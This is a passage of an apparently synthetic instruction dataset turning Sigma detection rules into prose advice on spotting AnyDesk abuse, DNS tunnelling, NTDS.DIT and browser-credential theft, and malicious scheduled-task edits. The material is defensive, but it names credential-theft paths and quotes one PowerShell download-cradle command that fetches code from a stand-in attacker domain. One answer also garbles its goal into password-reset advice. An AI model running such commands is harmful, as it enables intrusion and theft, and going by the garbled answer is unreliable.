    "output": "In order to detect and locate events where an adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc., to establish an interactive command and control channel to target systems within networks, you should: Monitor Windows system process creation logs for instances of the AnyDesk application being executed. Key indicators include processes that have an image name ending with '\\AnyDesk.exe', have a description of \"AnyDesk\", list \"AnyDesk\" as the product, and identify AnyDesk Software GmbH as the company. It's important to account for legitimate uses of AnyDesk, as it is a commercial software widely used for legitimate remote desktop access purposes. The detection level for this activity is considered medium, reflecting the balance between the potential malicious use of AnyDesk for establishing a command and control channel and its common legitimate use for remote desktop support. This detection strategy is designed to uncover tactics and techniques associated with the use of legitimate software for malicious purposes, aligning with the broader understanding of how adversaries exploit these tools.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
      "answer": "In order to detect and locate events where an adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc., to establish an interactive command and control channel to target systems within networks, you should: Monitor Windows system process creation logs for instances of the AnyDesk application being executed. Key indicators include processes that have an image name ending with '\\AnyDesk.exe', have a description of \"AnyDesk\", list \"AnyDesk\" as the product, and identify AnyDesk Software GmbH as the company. It's important to account for legitimate uses of AnyDesk, as it is a commercial software widely used for legitimate remote desktop access purposes. The detection level for this activity is considered medium, reflecting the balance between the potential malicious use of AnyDesk for establishing a command and control channel and its common legitimate use for remote desktop support. This detection strategy is designed to uncover tactics and techniques associated with the use of legitimate software for malicious purposes, aligning with the broader understanding of how adversaries exploit these tools."
    }
  },
  {
    "instruction": "Explain how should I detect the following: Extremely high rate of NULL record type DNS requests from host per short period of time. Possible result of iodine tool execution",
    "context": "",
    "output": "In order to detect an extremely high rate of NULL record type DNS requests from a host per short period of time, which could potentially indicate the execution of the iodine tool, you should: Monitor DNS logs for any instance where a source IP address generates more than 50 DNS queries for NULL record types within a one minute timeframe. Such behavior can indicate a security concern, specifically tactics and techniques that involve data exfiltration or tunneling methods. However, be aware that there may be legitimate reasons for a high rate of NULL DNS requests, so it's advisable to maintain a whitelist of domains known to generate high volumes of these requests under normal circumstances. This detection has a medium level of reliability and should prompt further investigation into the source IP for potential malicious activity.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Extremely high rate of NULL record type DNS requests from host per short period of time. Possible result of iodine tool execution",
      "answer": "In order to detect an extremely high rate of NULL record type DNS requests from a host per short period of time, which could potentially indicate the execution of the iodine tool, you should: Monitor DNS logs for any instance where a source IP address generates more than 50 DNS queries for NULL record types within a one minute timeframe. Such behavior can indicate a security concern, specifically tactics and techniques that involve data exfiltration or tunneling methods. However, be aware that there may be legitimate reasons for a high rate of NULL DNS requests, so it's advisable to maintain a whitelist of domains known to generate high volumes of these requests under normal circumstances. This detection has a medium level of reliability and should prompt further investigation into the source IP for potential malicious activity."
    }
  },
  {
    "instruction": "How to detect: usage of the \"Write-EventLog\" cmdlet with 'RawData' flag. The cmdlet can be levreage to write malicious payloads to the EventLog and then retrieve them later for later use",
    "context": "",
    "output": "In order to detect the usage of the \"Write-EventLog\" cmdlet with 'RawData' flag, which can be leveraged to write malicious payloads to the EventLog and then retrieve them later for use, you should: focus on monitoring Windows PowerShell script activities. This specifically entails ensuring that Script Block Logging is enabled, which is crucial for logging detailed execution information about PowerShell scripts, including the content of the scripts themselves. The detection strategy hinges on identifying the use of the \"Write-EventLog\" cmdlet in conjunction with the '-RawData' parameter within PowerShell scripts. These parameters together are indicative of an attempt to log data potentially for malicious purposes. It's essential to be aware of false positives, as legitimate applications may utilize this cmdlet for non-malicious purposes. Therefore, each alert generated under these criteria should be thoroughly investigated to ascertain whether the activity is benign or malevolent. The security severity associated with this kind of activity is considered medium, reflecting the need for prompt but measured response actions.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of the \"Write-EventLog\" cmdlet with 'RawData' flag. The cmdlet can be levreage to write malicious payloads to the EventLog and then retrieve them later for later use",
      "answer": "In order to detect the usage of the \"Write-EventLog\" cmdlet with 'RawData' flag, which can be leveraged to write malicious payloads to the EventLog and then retrieve them later for use, you should: focus on monitoring Windows PowerShell script activities. This specifically entails ensuring that Script Block Logging is enabled, which is crucial for logging detailed execution information about PowerShell scripts, including the content of the scripts themselves. The detection strategy hinges on identifying the use of the \"Write-EventLog\" cmdlet in conjunction with the '-RawData' parameter within PowerShell scripts. These parameters together are indicative of an attempt to log data potentially for malicious purposes. It's essential to be aware of false positives, as legitimate applications may utilize this cmdlet for non-malicious purposes. Therefore, each alert generated under these criteria should be thoroughly investigated to ascertain whether the activity is benign or malevolent. The security severity associated with this kind of activity is considered medium, reflecting the need for prompt but measured response actions."
    }
  },
  {
    "instruction": "Explain how should I detect the following: DNS server error in which a specified plugin DLL (in registry) could not be loaded",
    "context": "",
    "output": "In order to detect a DNS server error in which a specified plugin DLL (in registry) could not be loaded, you should focus on monitoring the event logs from a Windows DNS server for specific event IDs that signal this issue. Pay special attention to events with IDs 150, 770, and 771. These identifiers are crucial as they signify attempts or occurrences where a DNS server fails to load a plugin DLL as specified in its registry settings. This detection is important as it could indicate a misconfiguration or potentially malicious activity attempting to manipulate DNS operations. The importance of keeping an eye on these events is underscored by classifying the detection level as high, suggesting that occurrences of such events should be treated with a substantial degree of concern. Being vigilant about these specific event IDs on a Windows DNS server helps in promptly identifying and mitigating scenarios where the DNS functionality might be compromised due to issues with plugin DLLs.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "DNS server error in which a specified plugin DLL (in registry) could not be loaded",
      "answer": "In order to detect a DNS server error in which a specified plugin DLL (in registry) could not be loaded, you should focus on monitoring the event logs from a Windows DNS server for specific event IDs that signal this issue. Pay special attention to events with IDs 150, 770, and 771. These identifiers are crucial as they signify attempts or occurrences where a DNS server fails to load a plugin DLL as specified in its registry settings. This detection is important as it could indicate a misconfiguration or potentially malicious activity attempting to manipulate DNS operations. The importance of keeping an eye on these events is underscored by classifying the detection level as high, suggesting that occurrences of such events should be treated with a substantial degree of concern. Being vigilant about these specific event IDs on a Windows DNS server helps in promptly identifying and mitigating scenarios where the DNS functionality might be compromised due to issues with plugin DLLs."
    }
  },
  {
    "instruction": "Please help me detect the following: msdt.exe creating files in suspicious directories which could be a sign of exploitation of either Follina or Dogwalk vulnerabilities",
    "context": "",
    "output": "Sure!\nIn order to detect msdt.exe creating files in suspicious directories which could be a sign of exploitation of either Follina or Dogwalk vulnerabilities, you should: monitor file events within Windows systems for the execution of 'msdt.exe' especially when this executable creates files in critical locations. Specifically, watch for occurrences where 'msdt.exe' is involved in the creation of files on the user's Desktop, within the Startup folder in the Start Menu, or in system-critical directories such as 'C:\\PerfLogs\\', 'C:\\ProgramData\\', and 'C:\\Users\\Public\\'. These actions are red flags for potential malicious activity, pointing towards an exploitation attempt of known vulnerabilities, requiring immediate investigation. Be aware that detections involving these criteria are considered high priority due to the sensitive nature of the directories involved and the exploitation techniques associated with the Follina and Dogwalk vulnerabilities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "msdt.exe creating files in suspicious directories which could be a sign of exploitation of either Follina or Dogwalk vulnerabilities",
      "answer": "In order to detect msdt.exe creating files in suspicious directories which could be a sign of exploitation of either Follina or Dogwalk vulnerabilities, you should: monitor file events within Windows systems for the execution of 'msdt.exe' especially when this executable creates files in critical locations. Specifically, watch for occurrences where 'msdt.exe' is involved in the creation of files on the user's Desktop, within the Startup folder in the Start Menu, or in system-critical directories such as 'C:\\PerfLogs\\', 'C:\\ProgramData\\', and 'C:\\Users\\Public\\'. These actions are red flags for potential malicious activity, pointing towards an exploitation attempt of known vulnerabilities, requiring immediate investigation. Be aware that detections involving these criteria are considered high priority due to the sensitive nature of the directories involved and the exploitation techniques associated with the Follina and Dogwalk vulnerabilities."
    }
  },
  {
    "instruction": "Please help me detect the following: suspicious DACL modifications via the \"Set-Service\" cmdlet using the \"SecurityDescriptorSddl\" flag (Only available with PowerShell 7) that can be used to hide services or make them unstopable",
    "context": "",
    "output": "Sure!\nIn order to detect suspicious DACL modifications via the \"Set-Service\" cmdlet using the \"SecurityDescriptorSddl\" flag (Only available with PowerShell 7) that can be used to hide services or make them unstoppable, you should: monitor the creation of Windows processes for any instances of PowerShell 7 being executed, indicated by the process image name ending with '\\pwsh.exe' or originally named 'pwsh.dll'. Additionally, watch for command line arguments that include '-SecurityDescriptorSddl ' or '-sd ', which are used to specify security descriptors in SDDL format, and particularly focus on usage patterns that involve the 'Set-Service ' command with 'D;;' indicating changes to Discretionary Access Control Lists (DACLs), and also containing one of the following strings: ';;;IU', ';;;SU', ';;;BA', ';;;SY', ';;;WD'. These strings represent different permissions and are critical indicators of attempts to modify service permissions in ways that could make services hidden or unstoppable. Remain vigilant for all these conditions being met simultaneously, as this combination strongly suggests malicious activity related to service and security descriptor manipulation.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious DACL modifications via the \"Set-Service\" cmdlet using the \"SecurityDescriptorSddl\" flag (Only available with PowerShell 7) that can be used to hide services or make them unstopable",
      "answer": "In order to detect suspicious DACL modifications via the \"Set-Service\" cmdlet using the \"SecurityDescriptorSddl\" flag (Only available with PowerShell 7) that can be used to hide services or make them unstoppable, you should: monitor the creation of Windows processes for any instances of PowerShell 7 being executed, indicated by the process image name ending with '\\pwsh.exe' or originally named 'pwsh.dll'. Additionally, watch for command line arguments that include '-SecurityDescriptorSddl ' or '-sd ', which are used to specify security descriptors in SDDL format, and particularly focus on usage patterns that involve the 'Set-Service ' command with 'D;;' indicating changes to Discretionary Access Control Lists (DACLs), and also containing one of the following strings: ';;;IU', ';;;SU', ';;;BA', ';;;SY', ';;;WD'. These strings represent different permissions and are critical indicators of attempts to modify service permissions in ways that could make services hidden or unstoppable. Remain vigilant for all these conditions being met simultaneously, as this combination strongly suggests malicious activity related to service and security descriptor manipulation."
    }
  },
  {
    "instruction": "Can you explain how to detect: suspicious process patterns used in NTDS.DIT exfiltration",
    "context": "",
    "output": "Certainly!\n\nIn order to detect suspicious process patterns used in NTDS.DIT exfiltration, you should focus on monitoring process creation events within Windows environments. Pay particular attention to processes associated with the execution of NTDSDump.exe or NTDSDumpEx.exe, especially when command lines indicate the handling of 'ntds.dit' or 'system.hiv' files, which are critical for NTDS.DIT exfiltration attempts. Additionally, be on the lookout for usage of the PowerShell script 'NTDSgrab.ps1'.\n\nBe vigilant for command lines that resemble system tools being misused for exfiltration purposes, such as one-liners utilizing 'ntdsutil.exe' for creating full directory copies of critical databases, or command lines copying the 'ntds.dit' file from its original location to another, which is a blatant sign of data exfiltration attempt.\n\nAnother key indicator of NTDS.DIT exfiltration includes PowerShell command lines specifically targeting 'ntds.dit' files. This can be a subtler approach but equally significant in the context of cyber attacks.\n\nFurthermore, scrutinize processes where 'ntds.dit' is involved, especially if the initiating parent process or the process itself is located in unusual directories like apache, tomcat, AppData, Temp, Public, or PerfLogs folders. These locations are not standard for legitimate system or administrative tools to operate from and can be indicative of an adversary attempting to camouflage their actions.\n\nImplementing these detection strategies involves looking for one or more of these suspicious activities. The high severity level attributed to these signs reflects their potential impact on organizational security, indicating a high likelihood of a targeted NTDS.DIT exfiltration attempt.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious process patterns used in NTDS.DIT exfiltration",
      "answer": "In order to detect suspicious process patterns used in NTDS.DIT exfiltration, you should focus on monitoring process creation events within Windows environments. Pay particular attention to processes associated with the execution of NTDSDump.exe or NTDSDumpEx.exe, especially when command lines indicate the handling of 'ntds.dit' or 'system.hiv' files, which are critical for NTDS.DIT exfiltration attempts. Additionally, be on the lookout for usage of the PowerShell script 'NTDSgrab.ps1'.\n\nBe vigilant for command lines that resemble system tools being misused for exfiltration purposes, such as one-liners utilizing 'ntdsutil.exe' for creating full directory copies of critical databases, or command lines copying the 'ntds.dit' file from its original location to another, which is a blatant sign of data exfiltration attempt.\n\nAnother key indicator of NTDS.DIT exfiltration includes PowerShell command lines specifically targeting 'ntds.dit' files. This can be a subtler approach but equally significant in the context of cyber attacks.\n\nFurthermore, scrutinize processes where 'ntds.dit' is involved, especially if the initiating parent process or the process itself is located in unusual directories like apache, tomcat, AppData, Temp, Public, or PerfLogs folders. These locations are not standard for legitimate system or administrative tools to operate from and can be indicative of an adversary attempting to camouflage their actions.\n\nImplementing these detection strategies involves looking for one or more of these suspicious activities. The high severity level attributed to these signs reflects their potential impact on organizational security, indicating a high likelihood of a targeted NTDS.DIT exfiltration attempt."
    }
  },
  {
    "instruction": "Can you explain how to detect: when an attacker tries to modify an already existing scheduled tasks to run from a suspicious location\nAttackers can create a simple looking task in order to avoid detection on creation as it's often the most focused on\nInstead they modify the task after creation to include their malicious payload\n",
    "context": "",
    "output": "Certainly!\n\nIn order to detect when an attacker tries to modify an already existing scheduled tasks to run from a suspicious location, you should: Monitor Windows process creation logs for instances where the `schtasks.exe` utility is used with the `/Change` and `/TN` command-line arguments. This is indicative of an attempt to modify a scheduled task's settings. Additionally, attention should be paid to instances where command-line executions involve suspicious file paths such as temporary folders (`\\AppData\\Local\\Temp`, `\\AppData\\Roaming\\`, `\\Users\\Public\\`, '\\WINDOWS\\Temp\\`, `\\Desktop\\`, `\\Downloads\\`, `\\Temporary Internet`, `C:\\ProgramData\\`, `C:\\Perflogs\\`, `%ProgramData%`, `%appdata%`, `%comspec%`, `%localappdata%`). Moreover, the execution of commands that could potentially be used in malicious operations should be closely scrutinized. These include but are not limited to usage of `regsvr32`, `rundll32`, `cmd` (with `/c`, `/k`, `/r` switches), `cmd.exe` (with `/c`, `/k`, `/r` switches), `powershell`, `mshta`, `wscript`, `cscript`, `certutil`, `bitsadmin`, `bash.exe`, `wmic`, `forfiles`, `scriptrunner`, `hh.exe`. This comprehensive approach is necessitated by attackers' tendency to modify existing tasks to evade detection, as task creation events are more commonly monitored for security threats. This vigilance helps in identifying and mitigating modification of scheduled tasks to execute malicious payloads from locations that are typically considered to be benign or less subject to scrutiny.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "when an attacker tries to modify an already existing scheduled tasks to run from a suspicious location\nAttackers can create a simple looking task in order to avoid detection on creation as it's often the most focused on\nInstead they modify the task after creation to include their malicious payload\n",
      "answer": "In order to detect when an attacker tries to modify an already existing scheduled tasks to run from a suspicious location, you should: Monitor Windows process creation logs for instances where the `schtasks.exe` utility is used with the `/Change` and `/TN` command-line arguments. This is indicative of an attempt to modify a scheduled task's settings. Additionally, attention should be paid to instances where command-line executions involve suspicious file paths such as temporary folders (`\\AppData\\Local\\Temp`, `\\AppData\\Roaming\\`, `\\Users\\Public\\`, '\\WINDOWS\\Temp\\`, `\\Desktop\\`, `\\Downloads\\`, `\\Temporary Internet`, `C:\\ProgramData\\`, `C:\\Perflogs\\`, `%ProgramData%`, `%appdata%`, `%comspec%`, `%localappdata%`). Moreover, the execution of commands that could potentially be used in malicious operations should be closely scrutinized. These include but are not limited to usage of `regsvr32`, `rundll32`, `cmd` (with `/c`, `/k`, `/r` switches), `cmd.exe` (with `/c`, `/k`, `/r` switches), `powershell`, `mshta`, `wscript`, `cscript`, `certutil`, `bitsadmin`, `bash.exe`, `wmic`, `forfiles`, `scriptrunner`, `hh.exe`. This comprehensive approach is necessitated by attackers' tendency to modify existing tasks to evade detection, as task creation events are more commonly monitored for security threats. This vigilance helps in identifying and mitigating modification of scheduled tasks to execute malicious payloads from locations that are typically considered to be benign or less subject to scrutiny."
    }
  },
  {
    "instruction": "Please help me detect the following: Adversaries may acquire credentials from web browsers by reading files specific to the target browser.\nWeb browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future.\nWeb browsers typically store the credentials in an encrypted format within a credential store.\n",
    "context": "",
    "output": "Sure!\nIn order to detect activities where adversaries may acquire credentials from web browsers by reading files specific to the target browser, you should be vigilant about several indicators of compromise on Windows operating systems. Monitoring process creation events is crucial for early detection. Specifically, watch for command line statements that include commands such as 'copy-item', 'copy', 'cpi', 'cp', 'move', 'move-item', 'mi', and 'mv'. These commands may indicate an attempt to copy or move files, which could include sensitive information such as browser credentials.\n\nFurther, any processes that are launched where the binary image ends with '\\xcopy.exe' or '\\robocopy.exe' should raise suspicions. Additionally, the OriginalFileName field containing 'XCOPY.EXE' or 'robocopy.exe' in the process creation events should be closely monitored. These tools are legitimate Windows commands that could be misused to facilitate unauthorized copying or moving of files, potentially including encrypted browser credential stores.\n\nThe paths involved in such command-line activities are also telling. Paths containing '\\Opera Software\\Opera Stable\\', '\\Mozilla\\Firefox\\Profiles', '\\Microsoft\\Edge\\User Data\\', and '\\Google\\Chrome\\User Data\\' are particularly relevant. Activities involving these paths may indicate an attempt to access or manipulate web browser data, including saved credentials.\n\nAs with any detection strategy, it's important to be aware of potential false positives. Activities identified through these methods may not always be malicious, as similar actions can be part of legitimate maintenance or user activities. The detection level is considered medium, which means while the activities are indicative of potential credential access attempts, they should be corroborated with additional context to confirm malicious intent.\n\nIn summary, to safeguard against attempts to acquire browser credentials, closely monitor for specific command executions and process creations, especially those involving well-known file manipulation commands and paths associated with web browser user data. This proactive approach towards detection can help in identifying and mitigating potential threats aimed at accessing encrypted credentials stored by web browsers.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Adversaries may acquire credentials from web browsers by reading files specific to the target browser.\nWeb browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future.\nWeb browsers typically store the credentials in an encrypted format within a credential store.\n",
      "answer": "In order to detect activities where adversaries may acquire credentials from web browsers by reading files specific to the target browser, you should be vigilant about several indicators of compromise on Windows operating systems. Monitoring process creation events is crucial for early detection. Specifically, watch for command line statements that include commands such as 'copy-item', 'copy', 'cpi', 'cp', 'move', 'move-item', 'mi', and 'mv'. These commands may indicate an attempt to copy or move files, which could include sensitive information such as browser credentials.\n\nFurther, any processes that are launched where the binary image ends with '\\xcopy.exe' or '\\robocopy.exe' should raise suspicions. Additionally, the OriginalFileName field containing 'XCOPY.EXE' or 'robocopy.exe' in the process creation events should be closely monitored. These tools are legitimate Windows commands that could be misused to facilitate unauthorized copying or moving of files, potentially including encrypted browser credential stores.\n\nThe paths involved in such command-line activities are also telling. Paths containing '\\Opera Software\\Opera Stable\\', '\\Mozilla\\Firefox\\Profiles', '\\Microsoft\\Edge\\User Data\\', and '\\Google\\Chrome\\User Data\\' are particularly relevant. Activities involving these paths may indicate an attempt to access or manipulate web browser data, including saved credentials.\n\nAs with any detection strategy, it's important to be aware of potential false positives. Activities identified through these methods may not always be malicious, as similar actions can be part of legitimate maintenance or user activities. The detection level is considered medium, which means while the activities are indicative of potential credential access attempts, they should be corroborated with additional context to confirm malicious intent.\n\nIn summary, to safeguard against attempts to acquire browser credentials, closely monitor for specific command executions and process creations, especially those involving well-known file manipulation commands and paths associated with web browser user data. This proactive approach towards detection can help in identifying and mitigating potential threats aimed at accessing encrypted credentials stored by web browsers."
    }
  },
  {
    "instruction": "How to detect: exploits that use CVE-2017-11882 to start EQNEDT32.EXE and other sub processes like mshta.exe",
    "context": "",
    "output": "In order to detect exploits that use CVE-2017-11882 to start EQNEDT32.EXE and other sub processes like mshta.exe, you should: Monitor process creation events on Windows systems, focusing on spotting instances where the EQNEDT32.EXE application is the parent process initiating other processes. This activity is critical and typically signifies an exploitation of the CVE-2017-11882 vulnerability, which attackers leverage to execute arbitrary code through the Microsoft Office Equation Editor. Always pay attention to the command line context used during these process initiations for more detailed investigation and consider any occurrences as highly critical, though it's important to remember that there may be legitimate, albeit rare, uses of EQNEDT32.EXE that are not malicious in nature.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "exploits that use CVE-2017-11882 to start EQNEDT32.EXE and other sub processes like mshta.exe",
      "answer": "In order to detect exploits that use CVE-2017-11882 to start EQNEDT32.EXE and other sub processes like mshta.exe, you should: Monitor process creation events on Windows systems, focusing on spotting instances where the EQNEDT32.EXE application is the parent process initiating other processes. This activity is critical and typically signifies an exploitation of the CVE-2017-11882 vulnerability, which attackers leverage to execute arbitrary code through the Microsoft Office Equation Editor. Always pay attention to the command line context used during these process initiations for more detailed investigation and consider any occurrences as highly critical, though it's important to remember that there may be legitimate, albeit rare, uses of EQNEDT32.EXE that are not malicious in nature."
    }
  },
  {
    "instruction": "Please help me detect the following: execution of the PurpleSharp adversary simulation tool",
    "context": "",
    "output": "Sure!\nIn order to detect the execution of the PurpleSharp adversary simulation tool, you should: Monitor Windows process creation events for the execution of a program that has characteristics indicative of PurpleSharp. Specifically, look for processes being started from a path that contains '\\purplesharp' or processes that are named 'PurpleSharp.exe'. Additionally, pay attention to command-line arguments for any instances of 'xyz123456.exe' or the mention of 'PurpleSharp'. Such activities, identified in any one of these selection criteria, could signal the execution of the PurpleSharp simulation tool, which is critical to catch early due to its potential use in malicious contexts. Given that false positives are unlikely, any matches to these criteria should be treated with a high level of concern and investigated immediately.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of the PurpleSharp adversary simulation tool",
      "answer": "In order to detect the execution of the PurpleSharp adversary simulation tool, you should: Monitor Windows process creation events for the execution of a program that has characteristics indicative of PurpleSharp. Specifically, look for processes being started from a path that contains '\\purplesharp' or processes that are named 'PurpleSharp.exe'. Additionally, pay attention to command-line arguments for any instances of 'xyz123456.exe' or the mention of 'PurpleSharp'. Such activities, identified in any one of these selection criteria, could signal the execution of the PurpleSharp simulation tool, which is critical to catch early due to its potential use in malicious contexts. Given that false positives are unlikely, any matches to these criteria should be treated with a high level of concern and investigated immediately."
    }
  },
  {
    "instruction": "How to detect: execution of php using the \"-r\" flag. This is could be used as a way to launch a reverse shell or execute live php code.",
    "context": "",
    "output": "In order to detect execution of php using the \"-r\" flag, which could be used as a way to launch a reverse shell or execute live php code, you should: focus on monitoring process creation logs within Windows systems. Look specifically for any processes that end with '\\php.exe' or have an original filename of 'php.exe'. Additionally, scrutinize the command line arguments to identify instances where the '-r' flag is used, as this indicates the potential execution of PHP code directly from the command line, a technique commonly utilized in malicious activities. Keep in mind that while this detection mechanism is crucial for uncovering potential threats, there may be unknown benign activities that could trigger false positives. The severity level associated with this detection is considered medium.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of php using the \"-r\" flag. This is could be used as a way to launch a reverse shell or execute live php code.",
      "answer": "In order to detect execution of php using the \"-r\" flag, which could be used as a way to launch a reverse shell or execute live php code, you should: focus on monitoring process creation logs within Windows systems. Look specifically for any processes that end with '\\php.exe' or have an original filename of 'php.exe'. Additionally, scrutinize the command line arguments to identify instances where the '-r' flag is used, as this indicates the potential execution of PHP code directly from the command line, a technique commonly utilized in malicious activities. Keep in mind that while this detection mechanism is crucial for uncovering potential threats, there may be unknown benign activities that could trigger false positives. The severity level associated with this detection is considered medium."
    }
  },
  {
    "instruction": "Can you explain how to detect: The Reset-ComputerMachinePassword cmdlet changes the computer account password that the computers use to authenticate to the domain controllers in the domain.\nYou can use it to reset the password of the local computer.\n",
    "context": "",
    "output": "Certainly!\n\nIn order to reset the password of the local computer or change the computer account password that computers use to authenticate to the domain controllers in the domain, you should monitor Windows PowerShell modules activity for the execution of the \"Reset-ComputerMachinePassword\" cmdlet. This action can be identified in the logs generated by PowerShell module activity, specifically those with the definition ID \"0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\". Look for entries containing the context information \"Reset-ComputerMachinePassword\", as this indicates the cmdlet was used.\n\nBe aware that legitimate administrative activities may occasionally involve using this cmdlet, so not all instances may represent malicious behavior. These legitimate cases are commonly referred to as false positives; an example includes Administrator PowerShell scripts that are run for legitimate maintenance or recovery tasks.\n\nThis monitoring strategy is set at a medium level of alert priority, indicating that while the action monitored can be used in malicious scenarios; it can also be part of normal administrative duties. Identifying unauthorized or malicious use of the \"Reset-ComputerMachinePassword\" cmdlet may point towards attempts to manipulate computer accounts and their authentication processes to the domain controllers, which could impact the integrity and security of domain communications and accesses.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "The Reset-ComputerMachinePassword cmdlet changes the computer account password that the computers use to authenticate to the domain controllers in the domain.\nYou can use it to reset the password of the local computer.\n",
      "answer": "In order to reset the password of the local computer or change the computer account password that computers use to authenticate to the domain controllers in the domain, you should monitor Windows PowerShell modules activity for the execution of the \"Reset-ComputerMachinePassword\" cmdlet. This action can be identified in the logs generated by PowerShell module activity, specifically those with the definition ID \"0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\". Look for entries containing the context information \"Reset-ComputerMachinePassword\", as this indicates the cmdlet was used.\n\nBe aware that legitimate administrative activities may occasionally involve using this cmdlet, so not all instances may represent malicious behavior. These legitimate cases are commonly referred to as false positives; an example includes Administrator PowerShell scripts that are run for legitimate maintenance or recovery tasks.\n\nThis monitoring strategy is set at a medium level of alert priority, indicating that while the action monitored can be used in malicious scenarios; it can also be part of normal administrative duties. Identifying unauthorized or malicious use of the \"Reset-ComputerMachinePassword\" cmdlet may point towards attempts to manipulate computer accounts and their authentication processes to the domain controllers, which could impact the integrity and security of domain communications and accesses."
    }
  },
  {
    "instruction": "Can you explain how to detect: This rule tries to detect powershell download cradles, e.g. powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]",
    "context": "",
    "output": "Certainly!\n\nIn order to detect powershell download cradles, e.g. powershell . (nslookup -q=txt http://some.owned.domain.com)[-1], you should: focus on monitoring process creation events on Windows systems. Specifically, look for instances where the parent process is PowerShell (`powershell.exe`) and the child process involves `nslookup`. Additionally, check if the command line includes '=txt ', which is indicative of a DNS text record query often used in this context. This approach helps in identifying suspicious activities that attempt to leverage DNS queries through PowerShell for executing or downloading malicious payloads, serving as an effective method in pinpointing potential security breaches related to malicious domain interactions.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "This rule tries to detect powershell download cradles, e.g. powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]",
      "answer": "In order to detect powershell download cradles, e.g. powershell . (nslookup -q=txt http://some.owned.domain.com)[-1], you should: focus on monitoring process creation events on Windows systems. Specifically, look for instances where the parent process is PowerShell (`powershell.exe`) and the child process involves `nslookup`. Additionally, check if the command line includes '=txt ', which is indicative of a DNS text record query often used in this context. This approach helps in identifying suspicious activities that attempt to leverage DNS queries through PowerShell for executing or downloading malicious payloads, serving as an effective method in pinpointing potential security breaches related to malicious domain interactions."
    }
  },
  {
    "instruction": "Can you explain how to detect: Detect potential persistence via the creation of an excel add-in (XLL) file to make it run automatically when Excel is started.",
    "context": "",
    "output": "Certainly!\n\nIn order to detect potential persistence via the creation of an excel add-in (XLL) file to make it run automatically when Excel is started, you should: Monitor Windows registry modifications that are related to setting values within any subkey under 'Software\\Microsoft\\Office\\'. These modifications should specifically target the ending subkey path '\\Excel\\Options'. Furthermore, the details of these registry modifications should start with '/R ' and end with '.xll', indicating the registration of an XLL add-in file. Such activities are captured under Windows registry setting events, particularly those with the event type 'SetValue'. It's crucial to note that while this detection approach aims to identify malicious persistence mechanisms involving Excel add-ins, it may encounter unknown false positives, indicating situations where benign activities might match the detection criteria. This scenario underscores the high importance of vigilant monitoring and analysis within the specified registry paths and event characteristics to identify potential security threats related to persistence techniques.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Detect potential persistence via the creation of an excel add-in (XLL) file to make it run automatically when Excel is started.",
      "answer": "In order to detect potential persistence via the creation of an excel add-in (XLL) file to make it run automatically when Excel is started, you should: Monitor Windows registry modifications that are related to setting values within any subkey under 'Software\\Microsoft\\Office\\'. These modifications should specifically target the ending subkey path '\\Excel\\Options'. Furthermore, the details of these registry modifications should start with '/R ' and end with '.xll', indicating the registration of an XLL add-in file. Such activities are captured under Windows registry setting events, particularly those with the event type 'SetValue'. It's crucial to note that while this detection approach aims to identify malicious persistence mechanisms involving Excel add-ins, it may encounter unknown false positives, indicating situations where benign activities might match the detection criteria. This scenario underscores the high importance of vigilant monitoring and analysis within the specified registry paths and event characteristics to identify potential security threats related to persistence techniques."
    }
  },
  {
    "instruction": "How can I detect: suspicious PowerShell invocation command parameters",
    "context": "",
